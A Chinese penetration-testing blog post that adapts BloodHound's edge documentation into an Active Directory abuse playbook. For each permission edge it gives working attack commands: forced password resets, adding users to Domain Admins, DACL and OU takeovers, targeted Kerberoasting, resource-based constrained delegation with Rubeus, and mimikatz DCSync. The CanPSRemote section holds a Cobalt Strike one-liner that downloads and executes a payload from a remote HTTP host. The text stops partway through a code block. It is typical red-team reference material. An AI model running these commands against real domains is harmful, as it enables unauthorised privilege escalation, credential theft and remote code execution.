---
title: "BloodHound各权限的利用"
date: 2023-09-28 09:30:23 +0800
category: 渗透测试
tags: [内网,渗透测试,域]
excerpt: BloodHound各权限的利用
---
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#
## AdminTo
+ (u:User) - [:AdminTo] -> (c:Computer)

> user是computer上的本地管理员

+ 滥用信息
pth,rdp均可

## MemberOf
> Active Directory 中的组向其成员授予组本身拥有的任何权限。如果一个组拥有另一个主体的权限，则该组中的用户/计算机以及该组内的其他组将继承这些权限。

+ 滥用信息
没有必要滥用。该边仅表明主体属于安全组。

## HasSession
当用户对计算机进行身份验证时，他们通常会将凭据暴露在系统上，这些凭据可以通过 LSASS 注入、令牌操纵或盗窃或注入用户的进程来检索。

作为系统管理员的任何用户都能够从内存中检索凭证材料（如果该凭证材料仍然存在）。
> 会话不保证凭证材料存在，仅保证可能存在。

+ 滥用信息
> 必须能够横向移动到计算机，具有计算机上的管理访问权限，并且用户必须在计算机上具有非网络登录会话

mimikatz,窃取token,模拟令牌等

## HasSIDHistory
给定源主体在其 SIDHistory 属性中具有目标主体的 SID。

当为源主体创建 kerberos 票证时，它将包含目标主体的 SID，因此授予源主体与目标主体相同的特权和权限。

+ 滥用信息
无需采取特殊操作即可滥用此功能，因为创建的 kerberos 票证将添加对象 SID 历史属性中的所有 SID；但是，如果穿越域信任边界，请确保不强制执行 SID 过滤，因为 SID 过滤将忽略 kerberos 票证的 SID 历史记录部分中的任何 SID。
默认情况下，不为所有域信任类型启用 SID 过滤
参考:N-内网横向\林\SID-History

## ForceChangePassword

> User-Force-Change-Password

该边表示主体可以在不知道目标用户当前密码的情况下重置该用户的密码

+ 搜索条件

  用户OFFENSE\spotless是否对用户`delegate`有User-Force-Change-Password权限

  ```
  Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
  ```

+ 滥用信息
	+ net
	  `net user dfm.a Password123! /domain`
	
	+ PowerView (推荐)
	
	  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
	
	  DomainUserPassword 
	
	  要与 Set-DomainUserPassword 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：
	
	  ```
	  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
	  $Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)
	  ```
	
	  然后为要为目标用户设置的密码创建一个安全字符串对象：
	
	  ```
	  $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
	  ```
	
	  最后，使用 Set-DomainUserPassword，如果您尚未以具有密码重置权限的用户身份在进程中运行，则可以选择指定 $Cred
	
	  ```
	  Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
	  //或者一条命令
	  Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
	  ```

+ linux

  ```
  rpcclient -U KnownUsername 10.10.10.192
  > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
  ```

## AddMembers

该边缘表明主体有能力将任意主体添加到目标安全组。由于安全组委派，安全组的成员具有与该组相同的权限。

通过将自己添加到组并刷新令牌，您将获得该组拥有的所有相同权限。
+ 滥用信息
	+ net
	`net group "Domain Admins" dfm.a /add /domain`
	+ PowerView (推荐)
	  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

如果您没有以该用户身份运行进程，则可能需要以具有 AddMembers 权限的用户身份向域控制器进行身份验证。要与 Add-DomainGroupMember 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```
然后，使用 Add-DomainGroupMember，如果您尚未在具有 AddMembers 权限的用户拥有的进程中运行，则可以选择指定 $Cred
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```
最后，使用 PowerView 的 Get-DomainGroupMember 验证用户是否已成功添加到组中：
```
Get-DomainGroupMember -Identity 'Domain Admins'
```

## AddSelf

此边缘表示主体有能力将自身添加到目标安全组。由于安全组委派，安全组的成员具有与该组相同的权限。

通过将自己添加到组并刷新令牌，您将获得该组拥有的所有相同权限

+ 滥用信息

+ net
  `net group "Domain Admins" dfm.a /add /domain`
+ PowerView (推荐)
  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后，使用 Add-DomainGroupMember，如果您尚未在具有 AddSelf 权限的用户拥有的进程中运行，则可以选择指定 $Cred

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```

最后，使用 PowerView 的 Get-DomainGroupMember 验证用户是否已成功添加到组中：

```
Get-DomainGroupMember -Identity 'Domain Admins'
```

## CanRDP

远程桌面访问允许您进入与目标计算机的交互式会话。如果以低权限用户身份进行身份验证，则权限升级可能允许您获得系统上的高权限。

+ 滥用信息
	mstsc.exe

## CanPSRemote

PowerShell 会话访问允许您进入与目标计算机的交互式会话。如果以低权限用户身份进行身份验证，则权限升级可能允许您获得系统上的高权限

+ 滥用信息

可以使用 New-PSSession powershell 命令打开远程会话。

如果您不是以目标计算机上的 PSRemote 权限运行，则可能需要向域控制器进行身份验证。要与 New-PSSession 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后使用 New-PSSession 命令和我们刚刚创建的凭据：

```
$session = New-PSSession -ComputerName <target computer name> -Credential $Cred
```

这将在目标计算机上打开 PowerShell 会话

然后，您可以使用 Invoke-Command cmdlet 和刚刚创建的会话在系统上运行命令

```
Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
```

会话的清理是通过 Disconnect-PSSession 和 Remove-PSSession 命令完成的。

```
Disconnect-PSSession -Session $session
Remove-PSSession -Session $session
```

通过此 Cobalt Strike 进行横向移动的示例如下：

```
powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session
-ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))};
Disconnect-PSSession -Session $session; Remove-PSSession -Session $session
```

## ExecuteDCOM

可以通过在远程计算机上实例化 COM 对象并调用其方法来允许在某些条件下执行代码

+ 滥用信息

+ powershell

PowerShell 脚本 Invoke-DCOM 使用各种不同的 COM 对象（ProgId：MMC20.Application、ShellWindows、ShellBrowserWindow、ShellBrowserWindow 和 ExcelDDE）实现横向移动。LethalHTA 使用 HTA COM 对象（ProgId：htafile）实现横向移动。

人们可以使用以下 PowerShell 代码在远程计算机上手动实例化和操作 COM 对象。如果通过 COM 对象的 CLSID 指定它：

```
$ComputerName = <target computer name>              # Remote computer
$clsid = "{fbae34e8-bf95-4da8-bf98-6c6e580aa348}"   # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
```

如果通过 ProgID 指定 COM 对象：

```
$ComputerName = <target computer name>              # Remote computer
$ProgId = "<NAME>"                                  # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
```

+ impacket(dcomexec.py)
+ https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1

## SQLAdmin

用户是目标计算机上的 SQL 管理员

+ 滥用信息

+ https://github.com/NetSPI/PowerUpSQL
+ impacket(mssqlclient.py)

## AllowedToDelegate
+ 允许委托

约束委派原语允许主体以任何用户身份对目标计算机上的特定服务（在源节点选项卡的 msds-AllowedToDelegateTo LDAP 属性中找到）进行身份验证。也就是说，具有此权限的节点可以为目标主机上的特定服务模拟任何域主体（包括域管理员）。需要注意的是，模拟的用户不能属于“受保护用户”安全组，否则委派权限将被撤销。

约束委派中存在问题，其中生成的票证的服务名称 (sname) 不是受保护票证信息的一部分，这意味着攻击者可以将目标服务名称修改为他们选择的任何服务。例如，如果 msds-AllowedToDelegateTo 是“HTTP/host.domain.com”，则可以修改 LDAP/HOST/等的票证。服务名称，导致服务器完全受损，无论列出的具体服务是什么。

+ 滥用信息

滥用此权限可以利用 Benjamin Delpy 的 Kekeo 项目，代理 Impacket 库生成的流量，或使用 Rubeus 项目的 s4u 滥用。

在以下示例中，*受害者*是配置为受限委派的攻击者控制的帐户（即哈希值已知）。也就是说，*受害者*在其 msds-AllowedToDelegateTo 属性中设置了“HTTP/PRIMARY.testlab.local”服务主体名称 (SPN)。*该命令首先为受害者*用户请求 TGT ，并执行 S4U2self/S4U2proxy 进程，以模拟“HTTP/PRIMARY.testlab.local”SPN 的“admin”用户。替代名称“cifs”被替换到最终的服务票证中，并且该票证被提交到当前登录会话。这使攻击者能够以“admin”用户身份访问 PRIMARY.testlab.local 的文件系统。

```
Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt
```

## DCSync
该边代表 GetChanges 和 GetChangesAll 的组合。这两种权限的组合赋予主体执行 DCSync 攻击的能力。
+ 滥用信息

凭借 BloodHound 中的 GetChanges 和 GetChangesAll 权限，您可以执行 dcsync 攻击，以使用 mimikatz 获取任意主体的密码哈希：

```
lsadump::dcsync /domain:testlab.local /user:Administrator
```

您还可以执行更复杂的 ExtraSids 攻击来跳跃域信任。有关这方面的信息，请参阅引用选项卡中 Harmj0y 的博客文章。https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

## GetChanges/GetChangesAll

这两种权限的组合赋予主体执行 DCSync 攻击的能力。

+ 滥用信息

凭借 BloodHound 中的 GetChanges 和 GetChangesAll 权限，您可以执行 dcsync 攻击，以使用 mimikatz 获取任意主体的密码哈希：

```
lsadump::dcsync /domain:testlab.local /user:Administrator
```

您还可以执行更复杂的 ExtraSids 攻击来跳跃域信任。有关这方面的信息，请参阅引用选项卡中 Harmj0y 的博客文章。

## GenericAll

> WriteProperty
>
> GenericAll
>
> self

这也称为完全控制。此特权允许受托人随心所欲地操纵目标对象。

+ 滥用信息
  
  + **针对组 - 使用 GenericAll Over a Group：**
  
    让我们看看`Domain admins`组是否有弱权限。首先，让我们得到它`distinguishedName`：
  
    `Get-NetGroup "domain admins" -FullData`
  
    当前会话的用户(spotless)对`domain admins`组有GenericAll权限
  
    ` Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}`
  
    实际上，这允许我们将自己（用户`spotless`）添加到`Domain Admin`组中：
  
    `net group "domain admins" spotless /add /domain`
  
    使用 Active Directory 或 PowerSploit 模块也可以实现相同的效果：
  
    ```
    //with active directory module
    Add-ADGroupMember -Identity "domain admins" -Members spotless
    
    //with Powersploit
    Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
    ```
  
    

对组的完全控制允许您直接修改该组的组成员身份。有关该场景中的完整滥用信息，请参阅 AddMembers 边缘下的滥用信息部分

  + ​    **针对用户  - 使用 GenericAll 覆盖用户：**

> 查看当前会话的用户(spotless)是否对`delegate`有GenericAll权限	
```
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

**有针对性的 Kerberoast 有** 针对性的 kerberoast 攻击可以使用 PowerView 的 Set-DomainObject 以及 Get-DomainSPNTicket 来执行。

如果您不以该用户身份运行进程，则可能需要向域控制器进行身份验证，作为对目标用户具有完全控制权的用户。要与 Set-DomainObject 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后，使用 Set-DomainObject，如果您尚未以完全控制目标用户的用户身份运行进程，则可以选择指定 $Cred。

```
Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

运行此命令后，您可以使用 Get-DomainSPNTicket，如下所示：

```
Get-DomainSPNTicket -Credential $Cred harmj0y | fl
//或者
Rubeus.exe kerberoast /user:<username> /nowrap
//或者 https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```

可以使用您选择的工具离线破解恢复的哈希值。可以使用 Set-DomainObject 命令来清理 ServicePrincipalName：

```
Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
```

**有针对性的 ASREPRoasting ：您可以**通过**禁用****预身份验证来**使用户**ASREPRoastable** ，然后对其进行 ASREProast。 

```
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
**强制更改密码**

`net user <username> <password> /domain`  //建议使用powerview

您还可以通过对用户对象的完全控制来重置用户密码。有关此攻击的完整滥用信息，请参阅 ForceChangePassword 边缘下的信息

+ **针对计算机 - 在计算机上使用 GenericAll**

当计算机的本地管理员帐户凭据由 LAPS 控制时，对计算机对象的完全控制是可滥用的。本地管理员帐户的明文密码存储在计算机对象上名为 ms-Mcs-AdmPwd 的扩展属性中。通过完全控制计算机对象，您可能能够读取该属性，或者通过修改计算机对象的安全描述符授予自己读取该属性的能力。

或者，对计算机对象的完全控制可用于执行基于资源的约束委托攻击。

目前只能通过 Rubeus 项目滥用此原语。

首先，如果攻击者不控制具有 SPN 设置的帐户，则可以使用 Kevin Robertson 的 Powermad 项目添加新的攻击者控制的计算机帐户：

```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

然后可以使用 PowerView 检索新创建的计算机帐户的安全标识符 (SID)：

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

现在，我们需要以攻击者添加的计算机 SID 为主体构建通用 ACE，并获取新 DACL/ACE 的二进制字节：

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

接下来，我们需要在我们正在接管的计算机帐户的 msDS-AllowedToActOnBehalfOfOtherIdentity 字段中设置这个新创建的安全描述符，在本例中再次使用 PowerView：

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

然后我们可以使用 Rubeus 将明文密码哈希为 RC4_HMAC 形式：

```
Rubeus.exe hash /password:Summer2018!
```

最后，我们可以使用 Rubeus 的*s4u*模块来获取我们想要“假装”为“admin”的服务名称 (sname) 的服务票证。该票证被注入（感谢 /ptt），在本例中授予我们对目标计算机文件系统的访问权限：

```
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

**在域对象上使用 GenericAll**

对域对象的完全控制授予您 DS-Replication-Get-Changes 以及 DS-Replication-Get-Changes-All 权限。这些权限的组合允许您使用 mimikatz 执行 dcsync 攻击。要使用以下权限获取用户harmj0y的凭据：

```
lsadump::dcsync /domain:testlab.local /user:harmj0y
```

**在 GPO 上使用 GenericAll**

完全控制 GPO 后，您可以对该 GPO 进行修改，然后修改将应用于受 GPO 影响的用户和计算机。选择您想要将邪恶策略推送到的目标对象，然后使用 gpedit GUI 修改 GPO，使用允许项目级定位的邪恶策略，例如新的立即计划任务。然后等待至少 2 小时，让组策略客户端拾取并执行新的邪恶策略。有关此滥用行为的更详细记录，请参阅参考文献选项卡

**在 OU 上使用 GenericAll**

通过完全控制 OU，您可以在 OU 上添加新的 ACE，该 ACE 将继承到该 OU 下的对象。以下是两个选项，具体取决于您在此步骤中选择的目标：

通用后代对象接管：

滥用 OU 控制的最简单、最直接的方法是在将继承到所有对象类型的 OU 上应用 GenericAll ACE。同样，这可以使用 PowerView 来完成。这次我们将使用 New-ADObjectAccessControlEntry，它使我们能够更好地控制添加到 OU 的 ACE。

首先，我们需要通过 OU 的 ObjectGUID 而不是其名称来引用 OU。您可以通过单击 OU，然后检查*objectid*值，在 BloodHound GUI 中找到该 OU 的 ObjectGUID

接下来，我们将获取所有对象的 GUID。这应该是“00000000-0000-0000-0000-000000000000”：

```
$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
```

然后我们将构建我们的 ACE。此命令将创建一个 ACE，授予“JKHOLER”用户对所有后代对象的完全控制权：

```
ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
```

最后，我们将此 ACE 应用于我们的目标 OU：

```
$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

现在，“JKOHLER”用户将完全控制每种类型的所有后代对象。

有针对性的后代对象接管：

如果您希望您的方法更有针对性，则可以准确指定您想要将什么权限应用于哪些类型的后代对象。例如，您可以授予用户针对所有用户对象的“ForceChangePassword”权限，或者授予安全组读取特定 OU 下每个 GMSA 密码的能力。下面是一个取自 PowerView 帮助文本的示例，说明如何授予“ITADMIN”用户从“工作站”OU 中的所有计算机对象读取 LAPS 密码的能力：

```
$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

## WriteDacl

通过对目标对象的 DACL 的写访问权限，您可以授予自己对该对象所需的任何权限。

+ 滥用信息

通过修改目标对象上的 DACL 的能力，您可以授予自己针对您想要的对象的几乎任何特权。

**团体**

通过组上的 WriteDACL，授予您自己向组添加成员的权利：

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers
```

有关从此处执行攻击的更多信息，请参阅 AddMembers 边缘的滥用信息。

**用户**

使用对用户的 WriteDACL，授予您自己对用户对象的完全控制权：

```
Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All
```

有关如何从那里继续的更多信息，请参阅用户的 ForceChangePassword 和 GenericAll 的滥用信息。

**电脑**

通过计算机对象上的 WriteDACL，授予您自己对计算机对象的完全控制权：

```
Add-DomainObjectAcl -TargetIdentity windows1 -Rights All
```

然后读取计算机的 LAPS 密码属性或对目标计算机执行基于资源的约束委派。

**域名**

通过针对域对象的 WriteDACL，您可以授予自己 DCSync 的能力：

```
Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
```

然后执行DCSync攻击。

**GPO**

通过 GPO 上的 WriteDACL，您可以完全控制 GPO：

```
//给TestGPO设置所有权限
Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All
```

然后编辑 GPO 以接管 GPO 应用到的对象。

**组织单元**

通过 OU 上的 WriteDACL，授予您自己对该 OU 的完全控制权：

```
Add-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All
```

然后向 OU 添加一个新的 ACE，该 ACE 向下继承到子对象以接管这些子对象。

## GenericWrite

通用写入访问权限使您能够写入目标对象上的任何不受保护的属性，包括组的“成员”和用户的“serviceprincipalnames”

+ 滥用信息

**用户**

使用 GenericWrite 对用户执行有针对性的 kerberoasting 攻击。有关更多信息，请参阅 GenericAll 边缘下的滥用部分

**团体**

通过组上的 GenericWrite，将您自己或您控制的其他主体添加到组中。请参阅 AddMembers 边缘下的滥用信息以了解更多信息

```
# 创建认证信息
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# 检查用户是否已添加
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

**电脑**

通过计算机上的 GenericWrite，对计算机执行基于资源的约束委派。有关该攻击的更多信息，请参阅 GenericAll 边缘滥用信息。

**政府采购办公室**

通过 GPO 上的 GenericWrite，您可以对该 GPO 进行修改，然后修改将应用于受该 GPO 影响的用户和计算机。选择您想要将邪恶策略推送到的目标对象，然后使用 gpedit GUI 修改 GPO，使用允许项目级定位的邪恶策略，例如新的立即计划任务。然后等待组策略客户端拾取并执行新的邪恶策略。有关此滥用行为的更详细的记录，请参阅参考文献选项卡。

在极少数情况下，此边缘可能会误报。如果您对 GPO 具有 GenericWrite 权限，并且 ACL 中没有其他权限，且“仅限此对象”（无继承），则无法添加或修改 GPO 的设置。GPO 的设置存储在 SYSVOL 中给定 GPO 的文件夹下。因此，您需要对此文件夹的子对象的写入权限或创建子对象的权限。GPO 的安全描述符反映在文件夹上，这意味着需要在 GPO 上写入子项目的权限。

## WriteOwner

对象所有者保留修改对象安全描述符的能力，而不管对象的 DACL 的权限如何。

+ 滥用信息

要更改对象的所有权，您可以使用 PowerView 中的 Set-DomainObjectOwner 函数。

要通过 PowerView 的 Set-DomainObjectOwner 滥用此权限，请首先将 PowerView 导入到代理会话中或控制台上的 PowerShell 实例中。如果您没有以该用户身份运行进程，则可能需要以具有密码重置权限的用户身份向域控制器进行身份验证。

要与 Set-DomainObjectOwner 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后，使用 Set-DomainObjectOwner，如果您尚未以具有此权限的用户身份运行进程，则可以选择指定 $Cred：

```
Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
```

现在，有了对象的所有权，您就可以根据需要修改对象的 DACL。有关详细信息，请参阅 WriteDacl 边缘部分。

## WriteSPN

能够直接写入用户对象上的 servicePrincipalNames 属性。写入此属性使您有机会针对该用户执行有针对性的 kerberoasting 攻击。

+ 滥用信息

可以使用 PowerView 的 Set-DomainObject 和 Get-DomainSPNTicket 来执行有针对性的 kerberoast 攻击。

如果您不以该用户身份运行进程，则可能需要向域控制器进行身份验证，作为对目标用户具有完全控制权的用户。要与 Set-DomainObject 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后，使用 Set-DomainObject，如果您尚未以完全控制目标用户的用户身份运行进程，则可以选择指定 $Cred。

```
Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

运行此命令后，您可以使用 Get-DomainSPNTicket，如下所示：

```
Get-DomainSPNTicket -Credential $Cred harmj0y | fl
```

可以使用您选择的工具离线破解恢复的哈希值。可以使用 Set-DomainObject 命令来清理 ServicePrincipalName：

```
Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
```

## Owns

对象所有者保留修改对象安全描述符的能力，无论对象 DACL 的权限如何

+ 滥用信息

有了对象的所有权，您可以根据需要修改对象的 DACL。有关详细信息，请参阅 WriteDacl 边缘部分。

## AddKeyCredentialLink

能够写入用户或计算机上的“msds-KeyCredentialLink”属性。写入此属性允许攻击者在对象上创建“影子凭证”并使用 kerberos PKINIT 作为主体进行身份验证。

+ 滥用信息

要滥用此权限，请使用 Whisker：

```
Whisker.exe add /target:<TargetPrincipal>
```

对于其他可选参数，请查看 Whisker 文档。

## ReadLAPSPassword

此权限允许您从计算机读取 LAPS 密码

+ 滥用信息

如果您不以该用户身份运行进程，则可能需要向域控制器进行身份验证，作为对目标用户具有完全控制权的用户。要与 Get-DomainObject 结合执行此操作，首先创建一个 PSCredential 对象（这些示例来自 PowerView 帮助文档）：

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
```

然后，使用 Get-DomainObject，如果您尚未以完全控制目标用户的用户身份运行进程，则可以选择指定 $Cred。

```
Get-DomainObject -Credential $Cred -Identity windows10 -Properties "ms-mcs-AdmPwd",name
```

## ReadGMSAPassword

此权限允许您读取组托管服务帐户 (GMSA) 的密码。组托管服务帐户是一种特殊类型的 Active Directory 对象，其中该对象的密码由域控制器管理并按设定的时间间隔自动更改（检查 MSDS-ManagedPasswordInterval 属性）。

GMSA 的预期用途是允许某些计算机帐户检索 GMSA 的密码，然后作为 GMSA 运行本地服务。控制授权主体的攻击者可能会滥用该特权来冒充 GMSA。

+ 滥用信息

有多种方法可以滥用读取 GMSA 密码的能力。当 GMSA 当前登录到计算机时，最直接的滥用是可能的，这是 GMSA 的预期行为。

如果 GMSA 登录到有权检索 GMSA 密码的计算机帐户，则只需从作为 GMSA 运行的进程中窃取令牌，或注入该进程即可。

如果 GMSA 未登录到计算机，您可以创建计划任务或服务集以作为 GMSA 运行。计算机帐户将作为 GMSA 启动计划的任务或服务，然后您可以像标准用户在计算机上运行进程一样滥用 GMSA 登录（有关更多详细信息，请参阅“HasSession”帮助模式）。最后，可以远程检索 GMSA 的密码并将该密码转换为其等效的 NT 哈希值，然后执行 overpass-the-hash 来检索 GMSA 的 Kerberos 票证：

1. 从源代码构建 GMSAPasswordReader.exe： https: [//github.com/rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
2. 将 GMSAPasswordReader.exe 拖放到磁盘上。如果使用 Cobalt Strike，请使用执行程序集加载并运行此二进制文件

\3. 使用 GMSAPasswordReader.exe 检索 GMSA 的 NT 哈希值。您可能会返回多个 NT 哈希值，一个用于“旧”密码，一个用于“当前”密码。任一值都可能有效：

```
gmsapasswordreader.exe --accountname gmsa-jkohler
```

此时，您已准备好使用 NT 哈希，就像使用普通用户帐户一样。您可以执行 pass-the-hash、overpass-the-hash 或任何其他将 NT 哈希作为输入的技术。

## Contains

链接到容器的 GPO 适用于该容器包含的所有对象。此外，父 OU 上设置的 ACE 可以继承到子对象。

+ 滥用信息

通过控制 OU，您可以在 OU 上添加新的 ACE，该 ACE 将继承到该 OU 下的对象。以下是两个选项，具体取决于您在此步骤中选择的目标：

通用后代对象接管：

滥用 OU 控制的最简单、最直接的方法是在将继承到所有对象类型的 OU 上应用 GenericAll ACE。同样，这可以使用 PowerView 来完成。这次我们将使用 New-ADObjectAccessControlEntry，它使我们能够更好地控制添加到 OU 的 ACE。

首先，我们需要通过 OU 的 ObjectGUID 而不是其名称来引用 OU。您可以通过单击 OU，然后检查*objectid*值，在 BloodHound GUI 中找到该 OU 的 ObjectGUID

接下来，我们将获取所有对象的 GUID。这应该是“00000000-0000-0000-0000-000000000000”：

```
$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
```

然后我们将构建我们的 ACE。此命令将创建一个 ACE，授予“JKHOLER”用户对所有后代对象的完全控制权：

```
ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
```

最后，我们将此 ACE 应用于我们的目标 OU：

```
$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
```

现在，“JKOHLER”用户将完全控制每种类型的所有后代对象。

有针对性的后代对象接管：

如果您希望您的方法更有针对性，则可以准确指定您想要将什么权限应用于哪些类型的后代对象。例如，您可以授予用户针对所有用户对象的“ForceChangePassword”权限，或者授予安全组读取特定 OU 下每个 GMSA 密码的能力。下面是一个取自 PowerView 帮助文本的示例，说明如何授予“ITADMIN”用户从“工作站”OU 中的所有计算机对象读取 LAPS 密码的能力：

```
$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
